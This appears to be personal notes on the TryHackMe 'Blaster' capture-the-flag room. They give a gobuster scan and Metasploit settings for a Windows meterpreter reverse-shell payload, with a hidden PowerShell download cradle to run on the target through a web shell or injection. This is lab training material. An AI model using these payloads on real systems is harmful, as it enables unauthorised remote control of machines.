Throughout this room, we'll be looking at alternative modes of exploitation without the use of Metasploit or really exploitation tools in general beyond nmap and dirbuster. To wrap up the room, we'll be pivoting back to these tools for persistence and additional steps we can take. Without further delay, let's deploy our target machine!

  

![](https://assets.tryhackme.com/additional/imgur/bJEz0uL.png)  

_Art by one of our members, Varg - [THM Profile](https://tryhackme.com/p/Varg) - [Instagram](https://www.instagram.com/varghalladesign/) -_ _[Blaster Merch](https://www.redbubble.com/shop/ap/54430809) - [Twitter](https://twitter.com/Vargnaar)_

  

  

![](https://assets.tryhackme.com/additional/imgur/sXnrtFY.jpg)

_This room is a remix of my previous room [Retro](https://tryhackme.com/room/retro) with some complications I added to that room having been removed. For increased difficulty and an exercise in patience, check that room out after this. In addition, this room is the sequel to [Ice](https://tryhackme.com/room/ice). - DarkStar7471_

# Activate Forward Scanners and Launch Proton Torpedoes

nmap scan. 

```bash
gobuster dir -u http://10.112.144.183 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,aspx,asp,html,txt
```
# Breaching the Control Room
[Bing Videos](https://www.bing.com/videos/riverview/relatedvideo?q=https%3a%2f%2fwww.youtube.com%2fwatch%3fv%3d3BQKpPNlTSo&PC=U531&ru=%2fsearch%3fq%3dhttps%253A%252F%252Fwww.youtube.com%252Fwatch%253Fv%253D3BQKpPNlTSo%26FORM%3dSSQNT1%26PC%3dU531&mmscn=vwrc&mid=596E89F24995D18D2CA3596E89F24995D18D2CA3&FORM=WRVORC&ntb=1&msockid=b16fa434148b11f18cdffcba7382fb0f)
### The Fix: Switch to a Windows Payload

Run these commands in your Metasploit prompt to fix the compatibility:

codeBash

```
# 1. Change the payload to a Windows x64 Meterpreter
set payload windows/x64/meterpreter/reverse_tcp

# 2. Ensure your target is still set to PowerShell (Target 2)
set target 2

# 3. Double-check your LHOST (Your Kali IP)
set LHOST 192.168.158.93

# 4. Set your LPORT (Usually 4444 or 443)
set LPORT 4444

# 5. Run it again
exploit
```

### What to expect after you type exploit:

1. Metasploit will start a small web server on your Kali machine (on the SRVPORT you set, likely 8080).
    
2. It will print a **PowerShell command** (a "one-liner") to your screen. It starts with:  
    powershell.exe -nop -w hidden -c $n=new-object net.webclient...
    
3. **Copy that entire command.**
    
4. Go to the target IIS server (10.112.144.183) and execute that command through whatever entry point you found (e.g., a command injection vulnerability or a web shell).

[Metasploit Unleashed | Meterpreter Service](https://www.offsec.com/metasploit-unleashed/meterpreter-service/)